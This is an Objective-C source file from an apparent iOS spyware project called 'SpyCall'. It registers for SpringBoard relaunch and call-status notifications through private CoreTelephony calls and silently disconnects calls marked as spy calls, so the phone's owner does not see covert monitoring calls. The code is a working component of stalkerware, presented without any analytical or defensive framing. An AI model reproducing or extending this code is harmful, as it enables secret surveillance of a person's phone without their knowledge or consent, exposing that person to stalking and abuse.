//
//  SpringBoardDidLaunch.m
//  SpyCall
//
//  Created by Benjawan Tanarattanakorn on 12/4/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <pthread.h>


#import "SpringBoardDidLaunchNotifier.h"
#import "RecentCallNotifier.h"
#import "Telephony.h"

#define KCTCALLSTATUSCHANGENOTIFICATION             @"kCTCallStatusChangeNotification"
#define kUnRegisterTelephonyDelay					15


@interface SpringBoardDidLaunchNotifier (private)
- (void) disconnectCall: (id) aCall;
- (void) registerCallStatusChange;
- (void) unRegisterCallStatusChange;
@end

@implementation SpringBoardDidLaunchNotifier

@synthesize mRecentCallNotifier;

pthread_mutex_t _currentCallsMutex = PTHREAD_MUTEX_INITIALIZER;

- (id) initWithNotifier: (RecentCallNotifier *) aNotifier {
	self = [super init];
	if (self != nil) {
		mRecentCallNotifier = aNotifier;
	}
	return self;
}


#pragma mark -
#pragma mark SpringBoard


// This method will be called when the notificaiton is received
void springboardCallback (CFNotificationCenterRef center, 
						  void *observer, 
						  CFStringRef name, 
						  const void *object, 
						  CFDictionaryRef userInfo) {
    DLog(@"Notification intercepted (spycall): %@", name);
	DLog(@"Notification userInfo (spycall): %@ %@", (NSDictionary *) userInfo,object);
	
	SpringBoardDidLaunchNotifier *this = (SpringBoardDidLaunchNotifier *) observer;
	
	if ([(NSString *) name isEqualToString:@"SBSpringBoardDidLaunchNotification"]) {
		
		pthread_mutex_lock(&_currentCallsMutex); // To fix the crash: Segmentation fault: 11 in SpringBoard
		NSArray *calls = CTCopyCurrentCalls();
		pthread_mutex_unlock(&_currentCallsMutex);
		
		for (NSInteger i = 0; i < [calls count]; i++) {
			CTCall *call = (CTCall *)[calls objectAtIndex:i];
			DLog (@"call object %@", call)			
			NSString *caller = CTCallCopyAddress(NULL, call);		
			DLog (@">> caller number %@", caller);
			[caller autorelease];

 			if ([[this mRecentCallNotifier] isSpyCall:call]) {
				DLog (@"!!! This is SPYCALL, so disconnect the call")
				CTCallDisconnect(call);
			} else {
				DLog (@"!!! This is not spycall")
			}
		}
		
		[this registerCallStatusChange];						// register telephony notification
	}
}

// This method is aimed to register for the notification from SpringBaord
- (void) registerSpringBoardNotification {
    DLog(@">>>>>>>>>>>>>>>>>> registerSpringBoardNotification for spycall");
	
	CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),			// center
									self,													// observer. this parameter may be NULL.
									&springboardCallback,									// callback
									(CFStringRef) @"SBSpringBoardDidLaunchNotification",	// name
									NULL,													// object. this value is ignored in the case that the center is Darwin
									CFNotificationSuspensionBehaviorHold); 
}

- (void) unregisterSpringBoardNotification {
	DLog(@">>>>>>>>>>>>>>>>>> unregisterSpringBoardNotification for spycall");
	
	CFNotificationCenterRemoveObserver (CFNotificationCenterGetDarwinNotifyCenter(),
										self,
										(CFStringRef) @"SBSpringBoardDidLaunchNotification",
										NULL);
}


#pragma mark -
#pragma mark Telephony


void callbackTelephonyNotificationSpycall (CFNotificationCenterRef aNotificationCenter, 
										   void *aObserver, 
										   CFStringRef aNotificationName, 
										   const void *aObject, 
										   CFDictionaryRef aTelephonyNotificationDictionary) {
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSDictionary *notificationInfo = (NSDictionary *) aTelephonyNotificationDictionary;
	DLog (@"%@ Notification recevied with Info %@", (NSString *) aNotificationName, [notificationInfo description]);

	if (notificationInfo) {
				
		NSInteger callStatus = [[notificationInfo objectForKey:@"kCTCallStatus"] intValue];
		
		// this call back can be called with callStatus as 5 (disconnected) in the case that the call is disconnected
		
		if (callStatus == CALL_NOTIFICATION_STATUS_INCOMING ||		// 4 (found during testing)
			callStatus == CALL_NOTIFICATION_STATUS_INPROGRESS) {	// 1
			
			CTCall *call		= (CTCall *)[notificationInfo objectForKey:@"kCTCall"];
			NSString *caller	= CTCallCopyAddress(NULL, call);		
			DLog(@">> (While respring) caller number %@", caller);
			[caller autorelease];
			SpringBoardDidLaunchNotifier *this = (SpringBoardDidLaunchNotifier *) aObserver;
			
 			if ([[this mRecentCallNotifier] isSpyCall:call]) {
				DLog (@"==============================================")
				DLog (@"!!! (While respring) This is SPYCALL, so disconnect the call")
				
				//CTCallDisconnect(call);
				id tempCall = (id) call; 
				[this performSelector:@selector(disconnectCall:) withObject:tempCall afterDelay:0.5];
			} else {
				DLog (@"==============================================")
				DLog (@"!!! (While respring) This is not spycall")
				DLog (@"==============================================")
			}
		}
	}
	[pool release];
}

- (void) disconnectCall: (id) aCall {
	CTCallDisconnect((CTCall*) aCall);
}

- (void) registerCallStatusChange {
	DLog (@"==============================================")
	DLog (@"+++++ Register call status change for SPYCALL")
	DLog (@"==============================================")
	CTTelephonyCenterAddObserver((CFNotificationCenterRef) CTTelephonyCenterGetDefault(), 
                                 self, 
                                 callbackTelephonyNotificationSpycall, 
                                 (CFStringRef) KCTCALLSTATUSCHANGENOTIFICATION,
                                 nil,
                                 CFNotificationSuspensionBehaviorDeliverImmediately);
	
	[self performSelector:@selector(unRegisterCallStatusChange) withObject:nil afterDelay:kUnRegisterTelephonyDelay];
}

- (void) unRegisterCallStatusChange {
	DLog (@"==============================================")
	DLog (@"!!!!! Unregister call status change for SPYCALL")
	DLog (@"==============================================")
	CTTelephonyCenterRemoveObserver((CFNotificationCenterRef) CTTelephonyCenterGetDefault(),
                                    self,
                                    (CFStringRef) KCTCALLSTATUSCHANGENOTIFICATION,
                                    NULL);
}

- (void) dealloc {
	[self unregisterSpringBoardNotification];
	[self unRegisterCallStatusChange];
	mRecentCallNotifier = nil;
	[super dealloc];
}


@end
